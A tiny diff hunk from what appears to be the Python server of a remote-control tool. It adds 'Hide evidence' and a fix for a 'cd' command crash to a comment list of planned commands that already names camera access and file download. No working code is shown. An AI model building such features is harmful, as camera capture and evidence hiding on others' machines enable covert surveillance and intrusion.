@@ -7,7 +7,8 @@ from tqdm import tqdm
 # Custum commands
 #   Camera
 #   download files
-#   ...
+#   Hide evidence
+#   handle "cd " crash
 
 #Server vars
 SERVER_HOST = "0.0.0.0"
